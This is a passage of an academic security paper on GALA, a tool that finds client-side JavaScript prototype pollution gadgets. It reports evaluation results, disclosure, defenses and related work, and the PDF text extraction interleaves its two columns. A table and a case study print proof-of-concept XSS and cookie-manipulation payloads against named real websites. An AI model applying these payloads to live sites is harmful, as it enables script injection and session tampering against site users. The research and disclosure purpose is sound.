+Case 2: Gadget detected by self-serving websites. We 5 return e === "en" ? "" : g[e] || (t = ’<a data-
+illustrate a case study on a self-serving website, i.e., a lang="’ + e + ’">Title</a>’,
+6 g[e] = t)
+website that provides defined values itself with another call
+7 };
+stack.Inotherwords,thedefinedvaluesthatGALAcollects 8
+in Phase 2 from those websites can be used to guide the 9 // Main function with innerHTML as the sink
+10 var l = document.createElement("div");
+undefined properties on the same websites. Figure 5 shows 11 var n = document.createElement("div");
+the gadget from mountvernon.org. It is the official website 12 ...
+13 l.innerHTML = ’<div>’ + L("ar") + ’</div>’;
+for a historic estate located in Virginia and ranks 30,586 on
+14 n.innerHTML = ’<div>’ + L("ar") + ’</div>’;
+the Tranco website list.
+Now, we explain how the website provides defined
+Figure 5: [RQ1] A self-serving website (i.e., the defined
+values themselves. First, one div element l is generating
+values are provided by the same website to serve as the
+contentsforinnerHTMLatLine13andcallsthefunctionL
+undefined exploit).
+atLine 4.Then, g[e] atLine 5returns undefined since
+theobjectghasnopropertyyet.Afterwards,twillbecome
+a generated HTML string and the program stores it in g for
+pollution vulnerabilities. We use the same code from the
+convenience.Second,anotherdivelementnusesthesame
+original authors with a few more templates, e.g., more
+function to generate its HTML code and L is visited again.
+delimiters.Asdiscussed,thedetectionofprototypepollution
+This time, g[e] is the previously-stored defined value.
+vulnerabilities is not the focus of the paper and we do not
+Consequently, GALA discovers that value during Phase 2.
+claimanycontributionshere.Ifaprototypepollutionvulner-
+GALAthenleveragesittoguidetheundefinedg[e]lookup
+abilityisdetectedbyProbetheProto, GALA checkswhether
+and generate corresponding exploits for the innerHTML
+the website contains a zero-day gadget. If so, GALA will
+sink, as shown in Line 1 in Figure 5.
+generate an end-to-end exploit on the website and verify
+the exploit if the consequence is achieved, i.e., scripts get
+5.3. RQ2: Zero-day End-to-end Exploits executed for XSS, and values get injected for cookie and
+URL manipulations.
+In this research question, we answer the question of
+the number of end-to-end exploitable domains. Here is the 5.3.1. Statistics. Table 2 also shows the number of end-
+methodology. Specifically, GALA runs ProbetheProto [4] to-end domains for each gadget in the selective list. If
+on top of one million Tranco websites to find prototype an end-to-end exploit is possible, our “Generated Gadget
+
+TABLE 2: [RQ1&RQ2] A selective list of zero-day gadgets found by GALA. The “Library” column shows the third-party
+library name, the “# Domains” column the number of end-to-end exploitable domains with that library, the “Consequence”
+column the prototype pollution consequence of the gadget, which could be XSS (Cross-site Scripting), Cookie-M (Cookie
+Manipulation),andURL-M(URLManipulation),the“Type”columnwhetherthegadgetisdirectorchained,the“Reporting”
+whetherthegadgethasbeenreported,confirmedorfixed,andlastlythe“GeneratedExploitCode”theexploitcodegenerated
+by GALA to trigger the gadget.
+Library #Domains Consequence Type Reporting Generated GadgetExploitCode
+fbevents.js 21 Cookie-M Direct Fixed https://asse.com/?__proto__[0]=fb.1.COOKIE.INJECTION
+Vue2.6(1) 2 XSS Direct Fixed https://itongzhuo.com/?__proto__[staticStyle]=alert(1)})}//
+Vue2.6(2) 2 XSS Chained Fixed https://itongzhuo.com/?__proto__[key]=1&__proto__[classBinding]=alert(1)})}//
+Vue2.6(3) 0 XSS Chained Fixed __proto__[’value’]=’1’&__proto__[’staticClass’]=’alert(1)})};//’
+prettify.js 0 XSS Direct Reported __proto__[’-’]=’1"><imgsrc=1onerror=alert(1)></img></span><!--’
+gtranslate 0 XSS Direct Reported __proto__[’en’]="\"><imgsrc=1onerror=alert(1)></img><textarea>"
+cookie consent 0 XSS Direct Reported __proto__[’title’]=’<img src=1 onerror=alert(1)><textarea>’
+Baidum.js 0 XSS Direct Reported __proto__.pageSearchId=’1"></script><script>alert(1)</script><!--’
+lottie.js 0 XSS Direct Reported __proto__.x=’},{[alert(1)]:1}]//’
+webcomponents-loader 0 XSS Direct Reported __proto__[’root’]=’http://malicious.com’
+ga.js 0 Cookie-M Direct Reported __proto__[’x68’]=’(direct)’
+complete.js 0 Cookie-M Direct Reported __proto__[’analytics_session_token’]=’COOKIE-VALUE-1-2-3’
+require.js 0 URL-M Direct Reported __proto__[’baseURL’]=’KEY=VALUE1.VALUE2’
+TABLE3:[RQ1]Aconsequence-basedbreakdownofzero-
+and are considered as having no consequences. That also
+day gadgets (# Gadgets).
+demonstrates the power of newly-found, zero-day gadgets.
+Consequence Sink #Gadgets
+5.3.2. A Case Study. In this part, we illustrate a case
+HTML 21
+study of a real-world end-to-end exploit in Figure 6.
+XSS JavaScript 12
+setAttribute 23 This exploit leverages the gadget from Meta’s software
+‘fbevents.js’ as shown in Figure 1, and the prototype pollu-
+Sub-Total 56
+tion vulnerability is located at Line 19. Specifically, when
+anchor 11 a URL is parsed at the parseUrl function (Line 27),
+iframe 2
+the parse function is then called at Line 34. Then, the
+URLManipulation img 14
+script 23 parse function will be called recursively at Line 13,
+where part equals __proto__ and thus so does the
+Sub-Total 50
+key parameter of the parse function. After that, Line 16
+CookieManipulation cookie 27 is executed, which makes obj a prototypical object, i.e.,
+Total 133 Object.prototype.Sincetherearenokeysunderobj,
+its length equals 0, which pollutes the 0 property of the
+prototypical object. Finally, as the Meta gadget in Figure 1
+ExploitCode”columnusesareal-world,vulnerabledomain requires access to the 0 property, the prototype pollution
+as an example to show the end-to-end exploit and the “# vulnerability is connected with the gadget, leading to the
+Domains” shows the number of affected domains with end- cookie manipulation consequence.
+to-end exploits. As expected, 21 domains use “fbevents.js” We choose to illustrate this end-to-end exploit due
+andarevulnerabletocookiemanipulations.Thatisalsowhy to the complexity of connecting the prototype pollu-
+Meta quickly fixes the vulnerability based on our reporting. tion with the gadget. Specifically, if an adversary adopts
+Vuedevelopersalsoacknowledgedthevulnerabilityandare __proto__[0], the prototype pollution and the gadget
+working on a fix when the paper is submitted. GALA finds are not connected. The reason is that the first run of
+two domains that are end-to-end exploitable. Interestingly, parse will go to Line 11, and the second run to Line
+the two domains are only vulnerable to two gadgets in 13. Consequently, the prototype pollution injects an array
+Vue, but not the third one. The reason is that some values instead of a string to the prototypical object. Given that the
+may be defined in these two domains, making the third prototypepollutiongadgetcheckswhetherthetypeofb[0]
+gadget unexploitable. Another thing worth noting is that equals string but not array in Line 5 of Figure 1, the
+these 23 domains are in the ProbetheProto’s reports [4] exploit __proto__[0] will not lead to any consequence.
+
+1 // End-to-end exploit: ’https://www.perfectlens.ca/?
+have already flown to the sink. Therefore, GALA detected
+__proto__[]=fb.1.cookie.value’ many more gadgets compared with ProbetheProto.
+2 // 1. prototype pollution: purl.js We then discuss Silent Spring vs. GALA. Silent Spring
+3 function parse(parts, parent, key, val) {
+4 var part = parts.shift(); reports37gadgets,butmostofthereportsarefalsepositives.
+5 if (!part) { Note that a high FP is expected for Silent Spring given the
+6 if (isArray(parent[key])) {
+static nature of Silent Spring. The FDR is higher than the
+7 parent[key].push(val);
+8 } else if (’object’ == typeof parent[key]) { onereportedintheirpaperbecausetheirtargetisserver-side
+9 parent[key] = val; Node.js packages. As a comparison, client-side JavaScript
+10 } else if (’undefined’ == typeof parent[key]) {
+11 parent[key] = val; is mostly minimized and contains more dynamic features,
+12 } else { which brings more challenges for static analysis like Silent
+13 parent[key] = [parent[key], val];
+Spring and their underlying static analysis engine CodeQL.
+14 }
+15 } else{
+16 var obj = parent[key] = parent[key] || []; 5.4.2. False Negatives. Table 4 also shows the False Neg-
+17 if ("]" == part) {
+ative and False Negative Rate (FNR), i.e., FN/(TP+FN) of
+18 if ("object" == typeof obj) {
+19 obj[Object.keys(obj).length] = val; // three approaches using the BlackFan dataset. Let us start
+vulnerability location with Silent Spring, which only reports three true positives.
+20 }
+21 } ThemainreasonsforsuchalownumberofTPsaretwofold.
+22 else if (!part.includes("]")) { First, Silent Spring only supports detecting direct gadgets
+23 parse(parts, obj, part, val);
+from initially detected undefined properties lookups to the
+24 }
+25 } sinks without consideration of chained gadgets. 22 gadgets
+26 } in the BlackFan dataset are chained gadgets that require
+27 function parseUri(url){
+28 ... polluting multiple undefined properties to reach the sink.
+29 // key = "__proto__[]" Silent Spring detects none of these gadgets. Second, the
+30 // parent={"base":{}}
+underlying static analysis engine, i.e., CodeQL, cannot an-
+31 // val="fb.1.cookie.value"
+32 var parts = key.split("["); alyze many client-side JavaScript features, which include
+33 // parts = ["__proto__", "]"] dynamically-generated JavaScript code and inter-procedural
+34 parse(parts, parent, "base", val);
+35 } data-flow tracking.
+36 parseUri(document.URL); We then discuss ProbetheProto, which has 19 FNs for
+37
+thedataset.TherearetwomainreasonsforFNs.First,some
+38 // 2. Meta’s fbevents.js Gadget; please see Figure 1.
+chained gadgets require specific values to trigger the next
+gadget. Since such values are not in the predefined set of
+Figure 6: [RQ2] A case study of end-to-end exploits using
+ProbetheProto, it cannot detect such gadget chains. Second,
+the Meta gadget.
+thefinalpayloadtothesinkmayneedsomecontextstoclose
+thestring,e.g.,doublequotesandcomments.ProbetheProto
+As a comparison, GALA generates flexible exploits such does not support such context-award payload generation,
+as __proto__[] so that more exploitable gadgets are thus leading to a few FNs.
+exposed. In the end, we also discuss the FNs of GALA. GALA
+also misses the detection of nine gadgets reported in the
+5.4. RQ3: False Positives and Negatives of GALA BlackFan dataset. The main reason is that GALA does not
+find any defined values for such gadgets among the Top 1
+vs. Baselines
+millionwebsites.Inthefuture,wemayconsideraddingtest
+cases of JavaScript libraries and integrating value testing
+In this research question, we study the false positives with fuzzing to better generate such values.
+(FPs) and negatives (FNs) of GALA and compare GALA
+with two baselines. The evaluations of FPs and FNs are
+5.5. RQ4: Performance
+based on two different datasets because we do not have
+ground truth information for real-world websites and there
+In this research question, we study the performance of
+are no negative cases for the BlackFan dataset.
+GALAandbreakdowntheperformancebydifferentphases.
+Specifically, we evaluate the performance of GALA using
+5.4.1. FalsePositives.Table4showstheFalsePositivesand the Top 1,000 Tranco websites and measure the finish time
+FalseDiscoveryRate,i.e.,FP/(TP+FP),ofthreeapproaches of each phase. Figure 7 shows the Cumulative Distribution
+on top 1,000 Tranco websites. Let us first discuss Probethe- Function(CDF)of GALA inanalyzingTop1,000websites.
+Protovs.GALA.GALAreports15zero-daygadgetsamong At the same time, we also break down the analysis time by
+1,000 Tranco websites as opposed to one from ProbetheP- phases in Table 5.
+roto. The reason is that ProbetheProto adopts a fixed set of There are three things worth noting. First, Phase 1 is
+values (e.g., __proto__[k]=alert(1)) and hopes that the fastest because only undefined property lookups are
+the injected values can flow to the sink. Instead, GALA hookedwithouttaintpropagation.Second,theperformances
+borrows known values from Top 1 million websites, which of Phases 2 and 3 are similar, where Phase is slightly faster
+
+TABLE 4: [RQ3] False Discovery Rate (FDR), i.e., FP/(TP+FP), and False Negative Rate (FNR), i.e., FN/(TP+FN), of
+GALA andtwostateoftheartsagainsttwodatasets,i.e.,top1,000Trancowebsiteswithnogroundtruth,andtheBlackFan
+dataset [13] with ground truth information. All numbers are the number of gadgets.
+Top1,000Trancowebsites BlackFanDataset
+ApproachName TP
+Reported FP FDR(↓) TP FN All FNR(↓)
+Total XSS Cookie-M URL-M
+SilentSpring 37 1 1 0 0 36 97.30% 3 36 39 92.3%
+ProbetheProto 1 1 1 0 0 0 0.00% 20 19 39 48.7%
+GALA 15 15 3 6 6 0 0.00% 30 9 39 23.1%
+TABLE 5: [RQ4] Analysis Time (Seconds) of GALA Bro-
+ken Down by Different Phases.
+Phases Phase1 Phase2 Phase3 Total
+Time 4.30±2.32 6.67±5.54 7.09±4.29 15.44±8.91
+100
+80
+60
+40
+20
+0
+0.0 2.5 5.0 7.5 10.0 12.5 15.0 17.5
+Page Loading Time (seconds)
+)%(
+sniamoD
+fo
+egatnecreP
+TABLE 6: [RQ5] Ablation study of GALA with three
+variants.
+Components
+Variant #Gadgets
+DefinedValue Context-Aware
+Assignment ExploitGenerator
+GALA (cid:51) (cid:51) 133
+Variant(i) (cid:51) (cid:55) 77
+Variant(ii) (cid:55) (cid:51) 0
+Variant(iii) (cid:55) (cid:55) 0
+We evaluated all three variants on the 133 zero-day
+gadgets detected by GALA and the results are shown in
+Table 6. Notably, variants (ii) and (iii), which skip the
+Phase 1
+value assignment procedure, result in zero gadget detected.
+Phase 2
+Phase 3 That is because the values adopted from other websites are
+All vital for the control- or data-flow to reach the sink, e.g.,
+fulfillingcomplexifconditions.Ontheotherhand,variant
+(i)—which does not incorporate a context-aware exploit
+generator—only detects 77 gadgets, because exploiting the
+rest gadgets requires context-aware inputs, such as closing
+Figure 7: [RQ4] Cumulative Distribution Function (CDF)
+HTML tags. As a comparison, the design of GALA takes
+of the analysis time of GALA, which is broken down by
+advantageofbothdefinedvalueassignmentandthecontext-
+different phases for Top 1,000 Tranco websites.
+aware exploit generator, resulting in 133 gadgets detected.
+because of the involvement of exploit generation in Phase 5.7. RQ6: Defined Value Analysis
+3. Sometimes, Phase 3 is faster than Phase 2 as shown in
+Figure 7 because the first few trials of defined values may In this research question, we provide an analysis of the
+leadtoasuccessfulexploit.Lastly,themediananalysistime defined values tested during the evaluation of GALA on
+of GALA is around 12.5 seconds, which is scalable to an top one million Tranco websites. In total, GALA tested
+analysis on 1 million websites. 65,630 unique defined values for 24,679 undefined prop-
+erties, resulting in an average of 2.66 unique defined values
+5.6. RQ5: Ablation Study per undefined property. Eventually, 4,439 defined values
+successfully resulted in gadget discovery. Apart from those
+In this research question, we perform an ablation study statistics,wepresentdistributionofthetesteddefinedvalues
+to assess the impact of the different components of GALA. in Figure 8. The results show that the majority of undefined
+Specifically,ourablationstudyfocusesontwocomponents: properties, with a count of 21,416, have only one unique
+(i) defined value assignment, where GALA finds defined defined value, likely due to their limited use on real-world
+values in phase 2 to replace undefined properties identified websites. Following this, the counts drop sharply as the
+from phase 1, and (ii) a context-aware exploit generator number of defined values increases to two and three, and
+that GALA adapts from a prior work [26] in phase 3. continuetosteadilydeclineasthenumberofdefinedvalues
+Then, we describe three variants of GALA for the ablation exceeds three. This trend is driven by gadgets in libraries
+study:(i)notincorporatingacontext-awareexploitgenerator that are more widely used, resulting in GALA discovering
+(i.e.,adoptingfixedexploits);(ii)skippingthedefinedvalue more defined values in the same gadget used elsewhere. In
+assignment phase (i.e., no phase 2); or (iii) excluding both. addition, there are 176 cases where the number of unique
+
+104
+103
+102
+101
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+# Unique Defined Values per Undefined Property
+)elacS
+goL(
+stnuoC
+6.2.1. Defense against Prototype Pollution Vulnerabili-
+21,416
+ties. On one hand, software developers and maintainers can
+defend against gadgets by patching their root cause, i.e.,
+prototypepollutionvulnerability.Commonpracticesinclude
+freezing the prototypical object and checking the prototype
+1,705 chain lookup. One can refer to prior works [4], [6] on such
+defenses. However, while patching prototype pollution is
+502 neededanddefinitelyrequired,wedonotthinkitisenough
+284 to just patch the vulnerability but not the gadgets due to the
+172 following reasons:
+89 • Defense against future included or discovered prototype
+58 60
+44 pollution vulnerabilities. Even if a prototype pollution
+26 24 31 21 vulnerability is either patched or absent, people may find
+17 new vulnerabilities or the inclusion of new third-party
+12 13 11
+software may introduce new prototype pollution vulner-
+7
+6
+5 abilities. Patching gadgets will help the website defend
+against both scenarios.
+• Defense against prototype pollution vulnerabilities in
+other websites with the same library. A third-party
+Figure 8: [RQ6] Distribution of unique defined values per software containing prototype pollution gadgets may be
+undefined property that were tested during the evaluation of used by many websites, e.g., the “fbevents.js” library.
+GALA on Tranco top one million websites. Therefore,patchingaprototypepollutiongadgetwillhelp
+informthesewebsitesandfutureoneswhousethislibrary
+with the gadget.
+definedvaluesexceeds20,whicharenotshowninthefigure.
+The large number of defined values in these cases is due to 6.2.2. Defense against Prototype Pollution Gadgets. On
+gadgets utilizing keyed lookups wrapped in a for loop, the other hand, developers and maintainers can patch the
+which leads to numerous defined values during iterations. gadget as a direct defense. This can be done at either the
+source or the sink as discussed below. There are pros and
+cons for each patching method.
+6. Discussion
+• Source Patching. Such patching is done at the place
+where undefined values are returned. For example,
+In this section, we describe several commonly-asked
+just like what Meta does in Figure 1, one can use
+issues and GALA’s limitations.
+hasOwnProperty to check whether the returned value
+belongs to the prototypical object and deny access if it
+6.1. Ethics does. The advantage is that even if there are future sinks
+(other than the discovered gadget) that are found, the
+patchcanstilldefendagainstthenewgadget.Correspond-
+Weresponsiblyreportedallthefindings,includingzero-
+ingly, the disadvantage is that if there are other sources
+day gadgets and end-to-end exploits, to the software de-
+(i.e.,undefinedvalues)flowingtothesamesink,thepatch
+velopers and gave them 60 days to fix the issue. At the
+is ineffective.
+time of paper submission, one gadget has been fixed by
+• SinkPatching. Suchpatchingisdoneattheplacewhere
+their developer, three gadgets have been confirmed, and
+the consequence happens, e.g., cross-site scripting and
+the rest (including end-to-end exploits) have been reported.
+cookiemanipulation.Forexample,onecanaddasanitiza-
+Note that we choose to report our findings, i.e., end-to-
+tionfunctiontofiltertheparameterofevalfunctionand
+end exploits, to website developers even if the software
+avoid adversary-injected values. Similarly, the advantage
+(i.e., JavaScript library) containing the zero-day gadget—
+isthatiftherearenewsources,thepatchisstilleffective;
+whichisusuallyfromathirdparty—hasbeenfixedbytheir
+atthesametime,ifthecurrentsourceflowstoothersinks,
+developers. The reason is that third-party JavaScript library
+it is not.
+isoftennotupdatedtimelyonwebsites.Webelievethatsuch
+Sincebothgadgetpatchingmethodshaveprosandcons,
+reporting will help websites quickly fix the vulnerability,
+onepossiblesolutionistoadddoublepatching,i.e.,patching
+thus securing the World Wide Web.
+both the sources and the sinks, if possible.
+6.2. Defenses
+6.3. Soundness and Completeness
+Wediscussdefensesfromtwoperspectives,i.e.,defenses GALA,justlikepriorwork,e.g.,ProbetheProto[4],has
+against prototype pollution, and those against gadgets. no false positives, but false negatives still exist. That is,
+
+GALA issoundbutnotcomplete.Thereasonforsoundness the undefined properties. However, their approach mainly
+isthat GALA isadynamicapproachthatgeneratesexploits depends on static analysis and thus leads to a lot of false
+for found gadgets. Since gadgets are guaranteed to be ex- positives. Besides, their approach can not solve chained
+ploitable together with a prototype pollution vulnerability, gadgets. Mikhail et al. [31] uses a dynamic AST-level in-
+GALA has no FPs. strumentationandsupportsvisualizationofcodeflowsinan
+At the same time, GALA has false negatives due to IDE,whichhelpsthemanualanalysisforexploitgeneration.
+the following reasons. First, while GALA can find defined UoPF [5] applies concolic execution and constraint solver
+values for many undefined properties, it is still possible to detect chained gadgets. However, their approach fails to
+that such defined values do not exist. It could be that solve complex constraints.
+the functionality is rarely used, used in a different context On the other hand, the only prior work for client-side
+(like server-side code), or dead code. Currently, GALA has prototypepollutionandgadgetdetection,ProbetheProto[4],
+already adopted pre-defined values as inputs. Then, one utilizesaninstrumentedChromiumtodotaintanalysisona
+possible future solution is to adopt test cases that come large scale of websites. We highlight the novelty of GALA
+with third-party libraries for defined value extractions. We over ProbetheProto by explaining the three steps of an end-
+will leave this approach as future works of GALA. Second, to-end exploit and clarifying the distinct contributions of
+since GALA is a dynamic approach, it may have code both approaches. First, an adversary locates and exploits
+coverageissuestoreachcertaincodescontainingthesinkor an existing prototype pollution vulnerability to inject val-
+undefinedproperties.Notethatabsolutehighcodecoverage ues. Second, the adversary alters the control- or data-flow
+may not be helpful for GALA because GALA needs to by adjusting the injected values so that they can flow to
+reachthesourcesandsinks.Inthefuture,guidedordirected a sink. Lastly, the adversary exploits the sink function
+fuzzing may also be combined with GALA for better code (e.g., injecting XSS payloads). ProbeTheProto contributes
+coverage. Lastly, GALA currently only taints string values primarily to the first step, detecting prototype pollution.
+just like prior works [4], [25], [26]. This is because client- In contrast, GALA excels in the second and third steps
+side consequences are caused by string values. While other by replacing undefined properties with elsewhere-defined
+types,suchasArrayandObject,maybepossibleforserver- values, and by utilizing a context-aware exploit generator
+side consequences, we will leave them as future works. adapted from [26], whereas ProbeTheProto relies on prede-
+finedvalues.Asaresult,theexploitsadoptedby GALA are
+6.4. Other Consequences more comprehensive than ProbetheProto’s fixed value set,
+leading to the discovery of more zero-day gadgets.
+The in-scope consequences, just like ProbetheProto [4],
+include XSS, Cookie manipulations, and URL manipula- 7.2. Program Analysis for Web Security
+tions.Atthesametime,weacknowledgethattherecouldbe
+consequences for other client-side vulnerabilities like cross- Program Analysis has long been leveraged by security
+site request forgery and privilege escalation since prototype researcherstounveilbugsandvulnerabilitiesinsourcecode
+pollution changes the control- and data-flows of a victim or binary code. We describe program-analysis techniques—
+program. It is worth noting that such consequences are not dynamic analysis, static analysis and hybrid analysis—that
+studied manually either (e.g., the BlackFan repository [13] are commonly applied in the realm of Web security and
+does not have such consequences). Therefore, we will leave privacy,particularlyofvulnerabilitydetectionforJavaScript.
+the exploration of other consequences as our future work.
+7.2.1. DynamicAnalysis.Dynamicanalysisleveragescon-
+7. Related Work crete inputs to analyze program code. A research trend
+is to dynamically analyze program code from the source
+We describe related work from three aspects: prototype code level, e.g., Jalangi [32]. It is among the early-stage
+pollution, program analysis for web security, and general dynamic-analysis tools available for analyzing and testing
+web security. JavaScript applications. The success of Jalangi has inspired
+other works, e.g., JITProf [33], to develop analysis tools
+7.1. Prototype Pollution and its Gadgets on top of Jalangi. More recently, Xiao et al. [34] propose
+a framework named LYNX based on Jalangi to detect a
+Prototype pollution, first proposed by Arteau [1], has novel attack on JavaScript dubbed hidden property abusing.
+gathered increasing attention in recent years. Prototype Liu et al. [5] propose to detect chained server-side gad-
+pollution is specific to JavaScript and other programming getsleveragingJalangiforconcolicexecution.Additionally,
+languagesthatutilizeprototypesforobject-orientedfeatures. Liu et al. [35] extend Jalangi on WeChat as an industry
+It can lead to various severe consequences, such as Remote practice to diagnose defects in WeChat mini-apps. Despite
+Code Execution (RCE) on server-side [3], [5], [6], [30] and its flexibility, our experience with using Jalangi2 on client-
+XSS on client-side [4]. There are many existing works on side JavaScript revealed two major issues: 1) performance
+prototypepollutionandgadgetdetection.Ontheserverside, overhead; and 2) reliability of instrumented JavaScript.
+Silent Spring [6] leverages CodeQL [7] to do static multi- Firstly, the Jalangi2 wraps all the built-in operations with
+label taint analysis and uses dynamic analysis to collect function calls, which results in a slowdown of 3x-100x of
+
+theprogramexecution[36].Thismakesitunsuitableforour 7.3. General Web Security
+large-scale analysis. Secondly, the instrumented JavaScript
+grows approximately 60x in size (e.g., a library with 30k Our work consider three types of gadgets as in-scope:
+linesbecomes80MBafterinstrumentation),oftenleadingto DOM-based XSS, cookie manipulation and URL manipula-
+requesttimeoutswhenthefileisreceivedfromthenetwork. tion. Prior works on DOM-based XSS have investigated its
+Another research trend of dynamic analysis on prevalence [24], [25], [47], [48], different ways to inject
+JavaScript is to modify a modern JavaScript engine to con- payloads [4], [27], [49] and its mitigations [43], [47], [50]–
+ducttainttrackingforthepurposesofdefectorvulnerability [52].Cookie-relatedsecurityandprivacyconcernshavealso
+detection.Intheearlystage,Lekiesetal.[24]presentanau- gathered interests, leading to investigations on CSRF [44],
+tomatedsystemontopofJavaScriptV8enginetodetectand policy violations [53], [54], and session fixation [14], [15].
+validateDOM-basedCross-SiteScripting(XSS)vulnerabil- Finally,studiesonURLmanipuation[16]alsoproposenovel
+ities. Later, Melicher et al. [25] adopt the engine by Lekies attacks and effective mitigations. As a comparison, these
+et al. to perform DOM-XSS analysis on multiple sources works focus on each individual vulnerability itself instead
+and sinks. Steffens et al. [26] further introduce cookie and of those that are caused by prototype pollution. Instead,
+Web storage to the analysis engine. Kang et al. [4] invent GALAfindssuchconsequencesthatarecausedbyprototype
+object taints and joint taint flows for the analysis on client- pollution, thus being called prototype pollution gadgets.
+side prototype pollution and its consequences, e.g., XSS,
+cookie manipulation and URL manipulation. Following this 8. Conclusion
+research trend, our work implements the dynamic taint
+analysis on a modified Chromium for effective and precise
+Prototype pollution vulnerabilities, just like low-level
+taint tracking.
+memory-relatedvulnerabilities,needgadgetstoachievefur-
+ther consequences. Previously static approaches like Silent
+Spring [6] often have large false positives (FPs), which
+7.2.2. Static Analysis. On the other hand, static analysis need extensive human work to filter FPs. Furthermore, pre-
+usually leverages abstract interpretation and symbolic exe- vious dynamic approaches, such as ProbetheProto [4] and
+cution that do not require concrete inputs. Static analysis UoPF [5], often face difficulties in bypassing challenging
+explores all possible execution paths of the program and constraints with complex values. Furthermore, UoPF is also
+thus can reach higher code coverage compared to dynamic a server-side concolic execution framework and its adapta-
+analysis. Many works [2], [37]–[42] have proposed static- tion to the client side is largely unknown.
+analysis frameworks or platforms for the detection of bugs, Inthispaper,wedesignandimplementGALA,anopen-
+malware or vulnerabilities. More recently, researchers [3], source dynamic analysis framework, to detect client-side
+[30], [43], [44] have proposed to represent the program prototype pollution gadgets. Our key insight is to borrow
+code as novel graphs for static analysis. To make static defined values from other executions, which could happen
+analysis scalable, Kang et al. [45] leverage the bottom-up in another website with the same script or the same website
+and top-down abstract interpretation on control- and data- with different call stacks and/or parameters. GALA has
+flowgraphs.Whilethosemethodshavehighperformanceon three phases: first, GALA detects undefined values using
+server-side JavaScript vulnerability detection, they are not an instrumented JS runtime with property lookup APIs
+scalable to detect client-side gadgets, which involve heavy beinghooked;second,GALAdetectscorrespondingdefined
+dynamic features and easily make the methods timeout. values with the instrumented JS runtime and assigns such
+values to those that are originally undefined; lastly, GALA
+repeats the process until the sink is reached and then gen-
+7.2.3. Hybrid Analysis. To overcome the disadvantages of erates exploits for gadget validation.
+both static and dynamic analysis, researchers have recently We evaluated GALA against the Top 1 million websites
+proposed hybrid analysis, i.e., combining static with dy- based on Tranco List, which revealed 133 zero-day gadgets
+namic analysis, to have high code coverage and achieve and 23 end-to-end exploitable domains. We responsibly
+a better performance at the same time. Zhang et al. [46] disclosedourfindingstosoftwaredevelopersandgavethem
+leverageresultsfromdynamicanalysisasadditionalsources 60 days for a fix. Currently, several gadgets, including
+for static analysis to preserve context sensitivity when de- those from Meta and Vue.js, have already been fixed. We
+tecting taint data flows in Android apps. Shcherbakov et also show that GALA outperforms prior works, namely
+al. [6] leverage dynamic analysis to assist static analysis ProbetheProtoandSilentSpringintermsoflowerorsimilar
+for the detection of JavaScript gadgets leading to Remote false negatives and positives, when the prior works are
+Code Execution. Xiao et al. [34] introduce static analysis adapted to detect client-side gadgets.
+to explore potential object properties in JavaScript to guide Inthefuture,weenvisiontwotypesoffutureworks.On
+the execution of dynamic analysis. While the hybrid anal- one hand, we can integrate existing test cases of JavaScript
+ysis sounds promising, it still faces scalability issues when libraries with GALA so that they can provide more defined
+applied on client-side detection. We leave incorporating the valuesespeciallywhensuchvaluesarenotprovidedbyreal-
+hybrid analysis in GALA for future work. world websites. On the other hand, we can also integrate
+
+directed fuzzing with GALA to provide more values and [13] S. Bobrov, “Client-side prototype pollution gadgets,”
+lead the execution to the sink. https://github.com/BlackFan/client-side-prototype-pollution/blob/
+master/gadgets/sprint.md,2020,online;Accessedon18Feb2021.
+Acknowledgments [14] mwood, “Session fixation,” https://owasp.org/www-community/
+attacks/Session fixation,2024,online;Accessedon14Apr2024.
+[15] M.Squarcina,P.Ada˜o,L.Veronese,andM.Maffei,“Cookiecrum-
+Wewouldliketothankanonymousshepherdandreview-
+bles: Breaking and fixing web session integrity,” in 32nd USENIX
+ersfortheirhelpfulcommentsandfeedback.Thisworkwas SecuritySymposium,2023.
+supportedinpartbyNationalScienceFoundation(NSF)un-
+[16] P. Sharma and B. Nagpal, “A Study on URL Manipulation At-
+dergrantsCNS-21-54404andCNS-20-46361andaDefense tackMethodsandTheirCountermeasures,”InternationalJournalof
+Advanced Research Projects Agency (DARPA) Young Fac- EmergingTechnologyinComputerScience&Electronics(IJETCSE)
+ulty Award (YFA) under Grant Agreement D22AP00137- ISSN:0976-1353Volume15Issue1–MAY2015,vol.15,p.116–119,
+2015.
+00 as well as an Amazon Research Award (ARA) 2021
+and gifts from Visa Research. The views and conclusions [17] “Url manipulation attacks,” https://www.idc-online.com/technical
+references/pdfs/data communications/URL manipulation attacks.
+contained herein are those of the authors and should not be
+pdf,2024,online;Accessedon14Apr2024.
+interpretedasnecessarilyrepresentingtheofficialpoliciesor
+[18] N. Carlini and D. Wagner, “{ROP} is still dangerous: Breaking
+endorsements,eitherexpressedorimplied,ofNSF,DARPA,
+modern defenses,” in 23rd USENIX Security Symposium (USENIX
+Amazon, or Visa Research.
+Security14),2014,pp.385–399.
+[19] L.Davi,A.-R.Sadeghi,D.Lehmann,andF.Monrose,“Stitchingthe
+References gadgets:Ontheineffectivenessof{Coarse-Grained}{Control-Flow}
+integrityprotection,”in23rdUSENIXSecuritySymposium(USENIX
+Security14),2014,pp.401–416.
+[1] O. Arteau, “Prototype pollution attack in nodejs application,”
+https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/ [20] M. Schloegel, T. Blazytko, J. Basler, F. Hemmer, and T. Holz,
+master/paper/JavaScript prototype pollution attack in NodeJS.pdf, “Towards automating code-reuse attacks using synthesized gadget
+2018,online;Accessedon18Feb2021. chains,”inComputerSecurity–ESORICS2021:26thEuropeanSym-
+posium on Research in Computer Security, Darmstadt, Germany,
+[2] H.Y.Kim,J.H.Kim,H.K.Oh,B.J.Lee,S.W.Mun,J.H.Shin, October 4–8, 2021, Proceedings, Part I 26. Springer, 2021, pp.
+and K. Kim, “DAPP: automatic detection and analysis of prototype 218–239.
+pollutionvulnerabilityinnode.jsmodules,”InternationalJournalof
+InformationSecurity,pp.1–23,2021. [21] S. Han, S.-J. Kim, W. Shin, B. J. Kim, and J.-C. Ryou, “{Page-
+Oriented} programming: Subverting {Control-Flow} integrity of
+[3] S. Li, M. Kang, J. Hou, and Y. Cao, “Detecting node.js prototype commodity operating system kernels with {Non-Writable} code
+pollution vulnerabilities via object lookup analysis,” in Proceedings pages,”in33rdUSENIXSecuritySymposium(USENIXSecurity24),
+of the 29th ACM Joint Meeting on European Software Engineering 2024,pp.199–216.
+Conference and Symposium on the Foundations of Software Engi-
+neering,2021,pp.268–279. [22] Google.Ignition.https://v8.dev/docs/ignition.
